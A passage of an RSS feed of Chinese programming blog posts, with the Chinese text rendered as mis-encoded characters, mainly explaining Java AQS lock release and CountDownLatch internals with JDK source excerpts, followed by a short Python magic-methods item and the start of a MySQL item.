    // å½“é‡Šæ”¾èµ„æºçš„çº¿ç¨‹ä¸ç‹¬å é”ç°æœ‰çº¿ç¨‹ä¸ä¸€è‡´æ—¶ï¼Œéæ³•çº¿ç¨‹é‡Šæ”¾ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ã€‚
    if (Thread.currentThread() != getExclusiveOwnerThread())
        throw new IllegalMonitorStateException();
    boolean free = false;
    // è¿™é‡Œæ˜¯å¤„ç†é‡å…¥é”çš„æœºåˆ¶ï¼Œå› ä¸ºå¯é‡å…¥æœºåˆ¶ï¼Œæ‰€ä»¥æ¯æ¬¡éƒ½é‡å…¥stateå€¼éƒ½åŠ 1ï¼Œ
    //æ‰€ä»¥åœ¨é‡Šæ”¾çš„æ—¶å€™ä¹Ÿè¦ç›¸åº”çš„å‡1ï¼Œç›´åˆ°stateçš„å€¼ä¸º0æ‰ç®—å®Œå…¨çš„é‡Šæ”¾é”èµ„æºã€‚
    if (c == 0) {
        free = true;
        // å®Œå…¨é‡Šæ”¾èµ„æºåï¼Œå°†ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºnull,è¿™æ ·åé¢çš„ç«äº‰çº¿ç¨‹æ‰æœ‰å¯èƒ½æŠ¢å ã€‚
        setExclusiveOwnerThread(null);
    }
    // é‡æ–°èµ‹å€¼state
    setState(c);
    return free;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;tryRelease()&lt;/code&gt;æ–¹æ³•åœ¨é‡Šæ”¾é”èµ„æºæ—¶ï¼Œå¯ä»¥å•çº¯çš„ç†è§£ä¸ºæ˜¯ä¿®æ”¹ç‹¬å æ¨¡å¼çš„çŠ¶æ€å€¼å’Œç½®ç©ºå æœ‰çº¿ç¨‹çš„æ“ä½œã€‚å°†&lt;code&gt;state&lt;/code&gt;çš„å€¼å‡æ‰ç›¸åº”çš„å‚æ•°å€¼ï¼ˆä¸€èˆ¬æ˜¯1ï¼‰ï¼Œå¦‚æœè®¡ç®—ç»“æœä¸º0ï¼Œå°±å°†ä»–çš„ç‹¬å çº¿ç¨‹è®¾ç½®ä¸º&lt;code&gt;null&lt;/code&gt;ï¼Œå…¶ä»–çº¿ç¨‹æ‰æœ‰æœºä¼šæŠ¢å æˆåŠŸã€‚&lt;br/&gt;åœ¨åŠ é”æ—¶ï¼ŒåŒä¸€çº¿ç¨‹åŠ ä¸€æ¬¡é”ï¼Œ&lt;code&gt;state&lt;/code&gt;çŠ¶æ€å€¼å°±ä¼šåŠ 1ï¼Œåœ¨è§£é”çš„æ—¶å€™æ²¡è§£é”ä¸€æ¬¡å°±ä¼šå‡1ï¼ŒåŒä¸€ä¸ªé”å¯é‡å…¥ï¼Œåªæœ‰&lt;code&gt;lock&lt;/code&gt;æ¬¡æ•°ä¸&lt;code&gt;unlock&lt;/code&gt;æ¬¡æ•°ç›¸åŒæ‰ä¼šé‡Šæ”¾èµ„æºï¼Œå°†ç‹¬å çº¿ç¨‹è®¾ç½®ä¸ºnullã€‚&lt;/p&gt;
&lt;p&gt;é‡Šæ”¾äº†èµ„æºåï¼Œæˆ‘ä»¬å†çœ‹å”¤é†’æŒ‚èµ·çº¿ç¨‹æ—¶çš„è¿‡ç¨‹ã€‚è¿™ä¸ªè¿‡ç¨‹å°±åœ¨&lt;code&gt;unparkSuccessor()&lt;/code&gt;æ–¹æ³•ä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void unparkSuccessor(Node node) {
    /* è·å–å½“å‰èŠ‚ç‚¹çš„ç­‰å¾…çŠ¶æ€ï¼Œä¸€èˆ¬æ˜¯å¤´èŠ‚ç‚¹ï¼Œå æœ‰é”çš„èŠ‚ç‚¹æ˜¯åœ¨å¤´èŠ‚ç‚¹ä¸Šã€‚ */
    int ws = node.waitStatus;
    // å°†å½“å‰èŠ‚ç‚¹çš„çº¿ç¨‹çš„çŠ¶æ€å€¼è®¾ä¸º0ï¼Œæˆä¸ºæ— é”çŠ¶æ€ã€‚
    if (ws &amp;lt; 0)
        compareAndSetWaitStatus(node, ws, 0);
    /*
     * Thread to unpark is held in successor, which is normally
     * just the next node.  But if cancelled or apparently null,
     * traverse backwards from tail to find the actual
     * non-cancelled successor.
     */
    Node s = node.next;// è·å–ä¸‹ä¸€ä¸ªéœ€è¦å”¤é†’çš„èŠ‚ç‚¹çº¿ç¨‹ã€‚
    if (s == null || s.waitStatus &amp;gt; 0) {// å¦‚æœè·å–åˆ°çš„èŠ‚ç‚¹çº¿ç¨‹ä¸ºç©ºæˆ–å·²ç»å–æ¶ˆ
        s = null;
        // å°±ä»é˜Ÿåˆ—çš„åé¢å‘å‰æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªæœªå–æ¶ˆçš„èŠ‚ç‚¹ã€‚
        for (Node t = tail; t != null &amp;amp;&amp;amp; t != node; t = t.prev)
            if (t.waitStatus &amp;lt;= 0)
                s = t;
    }
    if (s != null) // å¦‚æœè·å¾—çš„ä¸‹ä¸€ä¸ªå¯ä»¥å”¤é†’çš„èŠ‚ç‚¹çº¿ç¨‹ä¸ä¸ºç©ºï¼Œé‚£ä¹ˆå°±å”¤é†’å®ƒã€‚
        LockSupport.unpark(s.thread);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è¿™ä¸ªé‡Šæ”¾è¿‡ç¨‹å°±æ˜¯å°†éœ€è¦é‡Šæ”¾çš„çº¿ç¨‹èŠ‚ç‚¹è®¾ç½®æˆæ— é”çŠ¶æ€ï¼Œç„¶åå»é˜Ÿåˆ—ä¸­æ‰¾åˆ°å¯ä»¥å”¤é†’çš„èŠ‚ç‚¹ï¼Œè¿›è¡Œå”¤é†’çº¿ç¨‹ã€‚&lt;br/&gt;&lt;strong&gt;æœ‰ä¸€ç‚¹éœ€è¦è§£é‡Šä¸€ä¸‹ï¼Œå°±æ˜¯åœ¨å¯»æ‰¾å¯ä»¥å”¤é†’çš„èŠ‚ç‚¹æ—¶ï¼Œä¸ºä»€ä¹ˆè¦ä»åå‘å‰æ‰¾ï¼Ÿ&lt;/strong&gt;&lt;br/&gt;åœ¨ä¸Šé¢&lt;code&gt;unparkSuccessor()&lt;/code&gt;æ–¹æ³•çš„æºç é‡Œé¢æœ‰ä¸€æ®µè‹±æ–‡æ³¨é‡Šï¼ˆ7è¡Œ~12è¡Œï¼‰ï¼Œæˆ‘ä¿ç•™äº†ä¸‹æ¥äº†ã€‚&lt;/p&gt;
&lt;blockquote readability=&quot;9&quot;&gt;
&lt;p&gt;/*&lt;br/&gt;* Thread to unpark is held in successor, which is normally&lt;br/&gt;* just the next node. But if cancelled or apparently null,&lt;br/&gt;* traverse backwards from tail to find the actual&lt;br/&gt;* non-cancelled successor.&lt;br/&gt;*/&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;è¿™æ®µè‹±æ–‡æ³¨é‡Šç¿»è¯‘è¿‡æ¥çš„å¤§æ¦‚æ„æ€å°±æ˜¯ï¼šçº¿&lt;strong&gt;ç¨‹å”¤é†’çš„æ—¶å€™ï¼Œé€šå¸¸æ˜¯ä»å½“å‰çº¿ç¨‹çš„ä¸‹ä¸ªèŠ‚ç‚¹çº¿ç¨‹å¼€å§‹å¯»æ‰¾ï¼Œä½†æ˜¯ä¸‹ä¸ªèŠ‚ç‚¹æœ‰å¯èƒ½å·²ç»å–æ¶ˆäº†æˆ–è€…ä¸ºnulläº†ï¼Œæ‰€ä»¥ä»åå‘å‰æ‰¾ï¼Œç›´åˆ°æ‰¾åˆ°ä¸€ä¸ªé å–æ¶ˆçŠ¶æ€çš„èŠ‚ç‚¹çº¿ç¨‹ã€‚&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;ç”±äºæ–‡ç« ç¯‡å¹…å¤ªé•¿äº†ï¼Œæˆ‘è¿™æ¬¡å°±å…ˆå°†ç‹¬å æ¨¡å¼çš„åŠ é”å’Œè§£é”çš„è¿‡ç¨‹æ€»ç»“åˆ°è¿™é‡Œï¼Œä¸‹ä¸€ç¯‡é€šè¿‡CountDownLatchçš„åŠ é”å’Œè§£é”è¿‡ç¨‹æ¥æ€»ç»“AQSåœ¨å…±äº«æ¨¡å¼ä¸‹è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;h3 id=&quot;aqså…±äº«æ¨¡å¼åˆ†æ&quot;&gt;AQSå…±äº«æ¨¡å¼åˆ†æ&lt;/h3&gt;
&lt;p&gt;å…¶å®AQSçš„å…±äº«æ¨¡å¼æ€»ç»“èµ·æ¥æ„Ÿè§‰æ¯”ç‹¬å æ¨¡å¼ç¨å¾®å®¹æ˜“ä¸€äº›ï¼Œåªæ˜¯è¯´æ€»ç»“èµ·æ¥ç¨å¾®å®¹æ˜“å“¦ã€‚&lt;/p&gt;
&lt;h4 id=&quot;countdownlatchçš„è·å–å…±äº«èµ„æºçš„è¿‡ç¨‹&quot;&gt;CountDownLatchçš„è·å–å…±äº«èµ„æºçš„è¿‡ç¨‹&lt;/h4&gt;
&lt;p&gt;åœ¨ä½¿ç”¨CountDownLatchçš„æ—¶å€™ï¼Œæ˜¯å…ˆåˆ›å»ºCountDownLatchå¯¹è±¡ï¼Œç„¶ååœ¨æ¯æ¬¡æ‰§è¡Œå®Œä¸€ä¸ªä»»åŠ¡åï¼Œå°±æ‰§è¡Œä¸€æ¬¡countDown()æ–¹æ³•ã€‚ç›´åˆ°é€šè¿‡getCount()è·å–åˆ°çš„å€¼ä¸º0æ—¶æ‰ç®—æ‰§è¡Œå®Œï¼Œå¦‚æœcountå€¼ä¸ä¸º0å¯é€šè¿‡await()æ–¹æ³•è®©ä¸»çº¿ç¨‹è¿›è¡Œç­‰å¾…ï¼ŒçŸ¥é“æ‰€æœ‰ä»»åŠ¡éƒ½æ‰§è¡Œå®Œæˆï¼Œcountçš„å€¼è¢«è®¾ä¸º0ã€‚&lt;br/&gt;é‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹åˆ›å»ºCountDownLatchçš„æ–¹æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public CountDownLatch(int count) {
    if (count &amp;lt; 0) throw new IllegalArgumentException(&quot;count &amp;lt; 0&quot;);
    this.sync = new Sync(count);
}

private static final class Sync extends AbstractQueuedSynchronizer {
   private static final long serialVersionUID = 4982264981922014374L;
   Sync(int count) {
       setState(count);
   }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æˆ‘ä»¬çœ‹åˆ°åˆ›å»ºCountDownLatchçš„è¿‡ç¨‹ï¼Œå…¶å®å°±æ˜¯å°†countå€¼èµ‹å€¼ç»™stateçš„è¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;å†æ¥çœ‹await()æ–¹æ³•çš„æºç ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void await() throws InterruptedException {
    sync.acquireSharedInterruptibly(1);// ç­‰å¾…å¯ä¸­æ–­çš„è·å–å…±äº«èµ„æºçš„æ–¹æ³•
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final void acquireSharedInterruptibly(int arg)
            throws InterruptedException {
    if (Thread.interrupted()) // å¦‚æœçº¿ç¨‹å·²ç»ä¸­æ–­ï¼Œç›´æ¥æŠ›å‡ºå¼‚å¸¸ç»“æŸã€‚
        throw new InterruptedException();
    if (tryAcquireShared(arg) &amp;lt; 0)// å°è¯•è·å–å…±äº«èµ„æºï¼Œè·å–å¤±è´¥åï¼Œè‡ªæ—‹å…¥é˜Ÿåˆ—
        doAcquireSharedInterruptibly(arg);// å¯ä¸­æ–­çš„å…¥é˜Ÿåˆ—è¿‡ç¨‹
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;æ•´ä¸ªawait()çš„ç­‰å¾…è¿‡ç¨‹æ˜¯ï¼Œå…ˆå°è¯•è·å–å…±äº«èµ„æºï¼Œè·å–æˆåŠŸåˆ™æ‰§è¡Œä»»åŠ¡ï¼Œè·å–å¤±è´¥ï¼Œåˆ™è°ƒç”¨æ–¹æ³•è‡ªæ—‹å¼è¿›å…¥ç­‰å¾…é˜Ÿåˆ—ã€‚&lt;br/&gt;é€šè¿‡æœ€åˆåœ¨ä»‹ç»AQSçš„æ—¶å€™å°±è¯´è¿‡ ï¼Œå…±äº«æ¨¡å¼ä¸‹æ˜¯éœ€è¦è‡ªå·±å»å®ç°tryAcquireShared()æ–¹æ³•æ¥è·å–å…±äº«èµ„æºçš„ï¼Œé‚£ä¹ˆæˆ‘ä»¬çœ‹çœ‹CountDownLatchæ˜¯å¦‚ä½•å®ç°è·å–å…±äº«èµ„æºçš„ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected int tryAcquireShared(int acquires) {
    return (getState() == 0) ? 1 : -1;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;ç®€å•æ˜“æ‡‚ï¼Œå°±ä¸€è¡Œä»£ç ï¼Œç›´æ¥è·å–stateå€¼ï¼Œç­‰äº0å°±æ˜¯æˆåŠŸï¼Œä¸ç­‰äº0å°±å¤±è´¥ã€‚&lt;/p&gt;
&lt;p&gt;é‚£ä¹ˆè·å–èµ„æºå¤±è´¥åï¼ŒdoAcquireSharedInterruptibly()æ–¹æ³•æ˜¯å¦‚ä½•å…¥æ‰§è¡Œçš„å‘¢ã€‚&lt;br/&gt;æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doAcquireSharedInterruptibly(int arg)
        throws InterruptedException {
    final Node node = addWaiter(Node.SHARED);// addWaiter()æ–¹æ³•å·²ç»æ€»ç»“è¿‡äº†ï¼Œè¿™ä¸€æ­¥æ“ä½œçš„ç›®çš„å°±æ˜¯å°†å½“å‰çº¿ç¨‹å°è£…æˆèŠ‚ç‚¹åŠ å…¥é˜Ÿå°¾ï¼Œå¹¶è®¾ç½®æˆå…±äº«æ¨¡å¼ã€‚
    boolean failed = true;
    try {
        for (;;) {
            final Node p = node.predecessor();// è·å–å‰çº§èŠ‚ç‚¹
            if (p == head) {
            // å¦‚æœå‰çº§èŠ‚ç‚¹æ˜¯å¤´èŠ‚ç‚¹ï¼Œç›´æ¥å°è¯•è·å–å…±äº«èµ„æºã€‚
                int r = tryAcquireShared(arg);
                if (r &amp;gt;= 0) {// å¦‚æœè·å–å…±äº«èµ„æºæˆåŠŸï¼Œå°†headèŠ‚ç‚¹æŒ‡å‘è‡ªå·±
                    setHeadAndPropagate(node, r);
                    p.next = null; // help GC å°†åŸheadèŠ‚ç‚¹æŒ‡å‘ç©ºï¼Œæ–¹ä¾¿åƒåœ¾å›æ”¶ã€‚
                    failed = false;
                    return;
                }
            }
            // å¦‚æœä¸æ˜¯å‰çº§èŠ‚ç‚¹ä¸æ˜¯headèŠ‚ç‚¹ï¼Œå°±æ ¹æ®å‰çº§èŠ‚ç‚¹çŠ¶æ€ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦æŒ‚èµ·çº¿ç¨‹ã€‚
            if (shouldParkAfterFailedAcquire(p, node) &amp;amp;&amp;amp;
                parkAndCheckInterrupt())
                throw new InterruptedException();
        }
    } finally {
        if (failed) // å¦‚æœæ‰§è¡Œå¤±è´¥ï¼Œå–æ¶ˆè·å–å…±äº«èµ„æºçš„æ“ä½œã€‚
            cancelAcquire(node);
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è¿™é‡Œçš„æ–¹æ³•å’Œç‹¬å æ¨¡å¼ä¸‹acquireQueued()æ–¹æ³•å¾ˆåƒï¼Œåªæ˜¯åœ¨è®¾ç½®å¤´èŠ‚ç‚¹å”¤é†’æ–°çº¿ç¨‹çš„æ—¶å€™æœ‰æ‰€ä¸åŒï¼Œåœ¨setHeadAndPropagate()æ–¹æ³•é‡Œé¢ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void setHeadAndPropagate(Node node, int propagate) {
    Node h = head; // Record old head for check below
    setHead(node);
   // å¦‚æœåœ¨å”¤é†’å®Œä¸‹ä¸€ä¸ªèŠ‚ç‚¹åï¼Œèµ„æºè¿˜æœ‰å‰©ä½™ï¼Œå¹¶ä¸”æ–°å”¤é†’çš„èŠ‚ç‚¹çŠ¶æ€ä¸ä¸ºæ— æ•ˆçŠ¶æ€ï¼Œå°±ç»§ç»­å”¤é†’é˜Ÿåˆ—ä¸­çš„åé¢èŠ‚ç‚¹é‡Œçš„çº¿ç¨‹ã€‚
    if (propagate &amp;gt; 0 || h == null || h.waitStatus &amp;lt; 0 ||
        (h = head) == null || h.waitStatus &amp;lt; 0) {
        Node s = node.next;
        if (s == null || s.isShared())
            doReleaseShared();
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;setHeadAndPropagate()è¿™ä¸ªæ–¹æ³•åç§°ç¿»è¯‘æˆä¸­æ–‡æ˜¯â€œè®¾ç½®å¤´èŠ‚ç‚¹å¹¶ä¼ æ’­â€ï¼Œå…¶å®å°±æ˜¯åœ¨è·å–å…±äº«é”èµ„æºçš„æ—¶å€™ï¼Œå¦‚æœèµ„æºé™¤äº†ç”¨äºå”¤é†’ä¸‹ä¸€ä¸ªèŠ‚ç‚¹åï¼Œè¿˜æœ‰å‰©ä½™ï¼Œå°±ä¼šç”¨äºå”¤é†’åé¢çš„èŠ‚ç‚¹ï¼Œç›´åˆ°èµ„æºè¢«ç”¨å®Œã€‚è¿™é‡Œå……åˆ†ä½“ç°å…±äº«æ¨¡å¼çš„â€œ&lt;strong&gt;å…±äº«&lt;/strong&gt;â€ã€‚&lt;/p&gt;
&lt;h3 id=&quot;countdownlatché‡Šæ”¾èµ„æº&quot;&gt;CountDownLatché‡Šæ”¾èµ„æº&lt;/h3&gt;
&lt;p&gt;æˆ‘ä»¬å†æ¥çœ‹countDown()æ–¹æ³•æ˜¯å¦‚ä½•é‡Šæ”¾èµ„æºçš„ã€‚&lt;br/&gt;æºç å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public void countDown() {
    sync.releaseShared(1);
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;CountDownLatchä¸­å†…éƒ¨ç±»Syncçš„releaseShared()æ–¹æ³•ï¼Œæ˜¯ä½¿ç”¨çš„AQSçš„releaseShared()æ–¹æ³•ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;public final boolean releaseShared(int arg) {
    if (tryReleaseShared(arg)) {// å°è¯•é‡Šæ”¾èµ„æº
        doReleaseShared();// é‡Šæ”¾èµ„æºæˆåŠŸåï¼Œå”¤é†’èŠ‚ç‚¹ã€‚
        return true;
    }
    return false;
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å°è¯•é‡Šæ”¾èµ„æºæ–¹æ³•tryReleaseShared()æ˜¯AQSè§„å®šéœ€è¦è‡ªå·±æ¥å®ç°çš„ï¼ŒCountDownLatchçš„å®ç°å¦‚ä¸‹ï¼š&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;protected boolean tryReleaseShared(int releases) {
    // Decrement count; signal when transition to zero
    for (;;) {
        int c = getState();
        if (c == 0) // è‹¥stateä¸º0ï¼Œè¯´æ˜å·²ç»ä¸éœ€è¦é‡Šæ”¾èµ„æºäº†ï¼Œç›´æ¥è¿”å›falseã€‚
            return false;
        int nextc = c-1;
        if (compareAndSetState(c, nextc))// çœŸæ­£çš„é‡Šæ”¾èµ„æºï¼Œæ˜¯é€šè¿‡CASçš„æ–¹å¼å°†stateçš„å€¼å‡1ã€‚
            return nextc == 0;
    }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;å…¶å®ä¸»è¦çš„å°±æ˜¯é€šè¿‡CASçš„æ–¹å¼å°†stateçš„å€¼å‡1çš„æ“ä½œã€‚&lt;br/&gt;é‡Šæ”¾èµ„æºæˆåŠŸåï¼Œå°±åˆ°äº†å”¤é†’èŠ‚ç‚¹çš„è¿‡ç¨‹äº†ï¼Œåœ¨doReleaseShared()æ–¹æ³•ä¸­ã€‚&lt;/p&gt;
&lt;pre&gt;
&lt;code class=&quot;language-java&quot;&gt;private void doReleaseShared() {
  for (;;) {
      Node h = head;
      if (h != null &amp;amp;&amp;amp; h != tail) {// å½“å¤´èŠ‚ç‚¹ä¸ä¸ºç©ºï¼Œå¹¶ä¸”ä¸ç­‰äºå°¾èŠ‚ç‚¹æ—¶ï¼Œä»å¤´å¼€å§‹å”¤é†’ã€‚
          int ws = h.waitStatus;// è·å–å¤´èŠ‚ç‚¹çš„ç­‰å¾…çŠ¶æ€
          if (ws == Node.SIGNAL) {// å¦‚æœå¤´èŠ‚ç‚¹çŠ¶æ€ä¸ºç­‰å¾…å”¤é†’ï¼Œé‚£ä¹ˆå°†å¤´èŠ‚ç‚¹çš„çŠ¶æ€è®¾ç½®ä¸ºæ— é”çŠ¶æ€ï¼Œè‹¥CASè®¾ç½®èŠ‚ç‚¹çŠ¶æ€å¤±è´¥ï¼Œå°±è‡ªæ—‹ã€‚
              if (!compareAndSetWaitStatus(h, Node.SIGNAL, 0))
                  continue;            // loop to recheck cases
              unparkSuccessor(h);// å”¤é†’å¤´èŠ‚ç‚¹
          }// å¦‚æœheadèŠ‚ç‚¹çš„çŠ¶æ€å·²ç»ä¸ºæ— é”çŠ¶æ€äº†ï¼Œé‚£ä¹ˆå°†headèŠ‚ç‚¹çŠ¶æ€è®¾ç½®ä¸ºå¯ä»¥å‘ä¸‹ä¼ æ’­å”¤é†’çš„çŠ¶æ€ï¼ˆPROPAGATEï¼‰ã€‚
          else if (ws == 0 &amp;amp;&amp;amp;
                   !compareAndSetWaitStatus(h, 0, Node.PROPAGATE))
              continue;                // loop on failed CAS
      }
      // è‹¥åœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒheadèŠ‚ç‚¹å‘ç”Ÿçš„å˜åŒ–ï¼Œç›´æ¥è·³å‡ºå¾ªç¯ã€‚
      if (h == head)                   // loop if head changed
          break;
  }
}
&lt;/code&gt;
&lt;/pre&gt;
&lt;p&gt;è‡³æ­¤ï¼ŒAQSçš„ç‹¬å æ¨¡å¼å’Œå…±äº«æ¨¡å¼ï¼Œåœ¨è·å–å…±äº«èµ„æºå’Œé‡Šæ”¾å…±äº«èµ„æºçš„è¿‡ç¨‹ï¼Œå°±æ€»ç»“å®Œäº†ã€‚å†…å®¹æœ‰ç‚¹å¤šï¼Œéœ€è¦å¥½å¥½æ¶ˆåŒ–ä¸€ä¸‹ï¼Œèƒ½çœ‹åˆ°æœ€åçš„ä¹Ÿéƒ½å‰å®³çš„äººç‰©ï¼Œå› ä¸ºæˆ‘è‡ªå·±åœ¨æ€»ç»“è¿™éƒ¨åˆ†å†…å®¹çš„æ—¶å€™ä¹Ÿæ˜¯æŸ¥é˜…äº†å¾ˆå¤šèµ„æ–™ï¼Œçœ‹äº†å¾ˆå¤šæºç ï¼Œç”¨äº†å¥½å‡ å¤©çš„æ—¶é—´æ‰è‡ªå·±æ€»ç»“æ˜ç™½ï¼ŒAQSåˆ°åº•æ˜¯ä¸ªä»€ä¹ˆä¸œè¥¿ï¼Œæ˜¯æ€ä¹ˆä¸€ä¸ªæ‰§è¡Œè¿‡ç¨‹ã€‚&lt;/p&gt;
&lt;p&gt;å…¶å®AQSé‡Œé¢ä¸åªæˆ‘ä¸Šé¢æ€»ç»“çš„è¿™äº›å†…å®¹ï¼Œé‡Œé¢æ¯”å¦‚è¿˜æœ‰Conditionã€ä»¥åŠå¯ä¸­æ–­çš„è·å–èµ„æºï¼ˆacquireInterruptiblyã€ç‹¬å ã€‘ã€acquireSharedInterruptiblyã€å…±äº«ã€‘acquire()å’ŒacquireShared()åœ¨çº¿ç¨‹ç­‰å¾…è¿‡ç¨‹ä¸­éƒ½æ˜¯å¿½ç•¥ä¸­æ–­çš„ï¼‰ï¼Œè¿˜æœ‰ReentrantLockæ˜¯å¦‚ä½•å®ç°å…¬å¹³é”çš„ï¼ˆå…¶å®æ˜¯åœ¨ç«äº‰èµ„æºæ—¶å¦‚æœæœ‰æ–°è¿›å…¥çš„çº¿ç¨‹ï¼Œå…ˆåˆ¤æ–­é˜Ÿåˆ—ä¸­æ˜¯å¦æœ‰èŠ‚ç‚¹ï¼Œå¦‚æœæœ‰ç›´æ¥æ’å…¥é˜Ÿå°¾ç­‰å¾…ï¼ŒæŒ‰é¡ºåºè·å–èµ„æºï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;é€šè¿‡æ€»ç»“äº†AQSï¼ŒåŸºäºAQSå®ç°çš„ReentrantLockã€CountDownLatchã€Semaphoreç­‰çš„æºç åŸºæœ¬ä¸Šå°±èƒ½çœ‹æ‡‚äº†ï¼Œç”šè‡³å†ä¸Šå±‚çš„CyclicBarrierã€CopyOnWriteArrayListæˆ‘ä»¬é€šè¿‡çœ‹æºç ä¹Ÿèƒ½çŸ¥é“å¤§æ¦‚æ˜¯ä¸€ä¸ªä»€ä¹ˆè¿‡ç¨‹äº†ã€‚&lt;/p&gt;
&lt;p&gt;æœ€åï¼Œå†…å®¹æœ‰ç‚¹å¤šï¼Œæœ‰å†™çš„ä¸å¥½çš„åœ°æ–¹ä¹Ÿæ¬¢è¿æŒ‡æ­£ï¼ˆæˆ‘è¦æ˜¯èƒ½é—¹æ˜ç™½å°±æ”¹ï¼Œä¸æ˜ç™½æˆ‘ä¹Ÿæ²¡æ³•æ”¹ğŸ˜‚ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;å‚è€ƒèµ„æ–™ï¼š&lt;br/&gt;&lt;a href=&quot;https://segmentfault.com/a/1190000017372067&quot;&gt;æ·±å…¥åˆ†æAQSå®ç°åŸç†&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.cnblogs.com/waterystone/p/4920797.html#&quot;&gt;Javaå¹¶å‘ä¹‹AQSè¯¦è§£&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://mp.weixin.qq.com/s/trsjgUFRrz40Simq2VKxTA&quot;&gt;æˆ‘ç”»äº†35å¼ å›¾å°±æ˜¯ä¸ºäº†è®©ä½ æ·±å…¥ AQS&lt;/a&gt;&lt;br/&gt;ã€ŠJavaå¹¶å‘ç¼–ç¨‹çš„è‰ºæœ¯ã€‹&lt;/p&gt;
</description>
<pubDate>Wed, 30 Sep 2020 00:08:00 +0000</pubDate>
<dc:creator>çºªè«</dc:creator>
<og:description>å‰è¨€ åœ¨Javaé¢è¯•çš„æ—¶å€™ï¼Œå¤šçº¿ç¨‹ç›¸å…³çš„çŸ¥è¯†æ˜¯èº²ä¸æ‰çš„ï¼Œè‚¯å®šä¼šè¢«é—®ã€‚æˆ‘å°±è¢«é—®åˆ°äº†AQSçš„çŸ¥è¯†ï¼Œå°±ç›´æ¥äº†å½“çš„é—®ï¼ŒAQSçŸ¥é“æ˜¯ä»€ä¹ˆå§ï¼Œæ¥è®²è®²å®ƒæ˜¯æ€ä¹ˆå®ç°çš„ï¼Œä»¥åŠå“ªäº›åœ°æ–¹ç”¨åˆ°äº†å®ƒã€‚å½“æ—¶è‡ªå·±ç¡®å®æ²¡æœ‰è®²å¥½ï¼Œæ‰€ä»¥</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/jimoer/p/13747291.html</dc:identifier>
</item>
<item>
<title>pythoné­”æ³•å‡½æ•° - å¥¥è¾°</title>
<link>http://www.cnblogs.com/chenhuabin/p/13752770.html</link>
<guid isPermaLink="true" >http://www.cnblogs.com/chenhuabin/p/13752770.html</guid>
<description>&lt;pre&gt;
['__class__',
 '__delattr__',
 '__dict__',
 '__dir__',
 '__doc__',
 '__eq__',
 '__format__',
 '__ge__',
 '__getattribute__',
 '__gt__',
 '__hash__',
 '__init__',
 '__init_subclass__',
 '__le__',
 '__lt__',
 '__module__',
 '__ne__',
 '__new__',
 '__reduce__',
 '__reduce_ex__',
 '__repr__',
 '__setattr__',
 '__sizeof__',
 '__str__',
 '__subclasshook__',
 '__weakref__',
 'company_name',
 'fun']
&lt;/pre&gt;</description>
<pubDate>Tue, 29 Sep 2020 23:29:00 +0000</pubDate>
<dc:creator>å¥¥è¾°</dc:creator>
<og:description>é­”æ³•å‡½æ•°æ˜¯æŒ‡ç±»å†…éƒ¨ä»¥åŒä¸‹åˆ’çº¿å¼€å¤´ï¼Œå¹¶ä¸”ä»¥åŒä¸‹åˆ’çº¿ç»“å°¾çš„å‡½æ•°ï¼Œåœ¨ç‰¹å®šæ—¶åˆ»ï¼ŒPythonä¼šè‡ªåŠ¨è°ƒç”¨è¿™äº›å‡½æ•°ã€‚é­”æ³•å‡½æ•°ä¸æ˜¯é€šè¿‡ç»§æ‰¿ç­‰æœºåˆ¶è·å¾—çš„ï¼Œè€Œæ˜¯ç±»ä¸€æ—¦å®šä¹‰ï¼ŒPythonå†…éƒ¨æœºåˆ¶è‡ªåŠ¨ä¼šç»™ç±»èµ‹äºˆè¿™äº›ç‰¹æ®Šçš„å‡½</og:description>
<dc:language>zh-cn</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>https://www.cnblogs.com/chenhuabin/p/13752770.html</dc:identifier>
</item>
<item>
<title>mysql ç©ºå€¼ï¼ˆnullï¼‰å’Œç©ºå­—ç¬¦ï¼ˆ''ï¼‰çš„åŒºåˆ« - é’¢é“ä¾ çš„çŸ¥è¯†åº“</title>
<link>http://www.cnblogs.com/jiba/p/13752664.html</link>
